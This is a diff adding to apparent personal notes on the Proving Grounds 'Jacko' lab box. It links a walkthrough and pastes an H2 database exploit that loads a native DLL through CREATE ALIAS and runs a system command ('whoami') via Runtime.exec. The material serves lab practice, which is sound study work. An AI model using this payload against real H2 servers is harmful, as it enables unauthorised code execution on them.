@@ -225,4 +225,19 @@ CALL EXECVE('dir');
 
 Failure. Okay. Time to take a break.
 
+Found a guide.
+
+https://medium.com/@ryanchamruiyang/proving-grounds-jacko-walkthrough-by-ryan-cham-db76be0699f4
+
+```sql
+-- H2 allows users to gain code execution by compiling and running Java code  
+-- however this requires the Java Compiler to be available on the machine running H2.  
+-- This exploit utilises the Java Native Interface to load a a Java class without  
+-- needing to use the Java Compiler
+-- Load native library  
+CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";  
+CALL System_load('C:\\Windows\\Temp\\JNIScriptEngine.dll');-- Evaluate script  
+CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";  
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\\\Z").next()');
+```
 # SYSTEM access
